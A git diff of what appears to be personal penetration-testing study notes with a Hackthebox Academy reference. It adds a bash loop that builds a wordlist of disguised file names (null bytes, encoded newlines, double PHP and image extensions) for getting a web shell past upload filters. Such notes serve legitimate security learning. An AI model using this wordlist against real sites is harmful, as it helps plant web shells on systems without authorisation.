@@ -20,14 +20,19 @@ Here is a small list of the cheat sheets i've been consistantly referring back t
 
 ---
 
->for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
-    for ext in '.php' '.phps' '.phar'; do
-        echo "shell$char$ext.jpg" >> wordlist.txt
-        echo "shell$ext$char.jpg" >> wordlist.txt
-        echo "shell.jpg$char$ext" >> wordlist.txt
-        echo "shell.jpg$ext$char" >> wordlist.txt
-    done
+here is a simple script that i used while trying to bypass and upload filter.
+
+
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+        for ext in '.php' '.phps' '.phar'; do
+           echo "shell$char$ext.jpg" >> wordlist.txt
+           echo "shell$ext$char.jpg" >> wordlist.txt
+           echo "shell.jpg$char$ext" >> wordlist.txt
+           echo "shell.jpg$ext$char" >> wordlist.txt
+       done
 done
+```
 
 ---
 #### Hackthebox Academy:
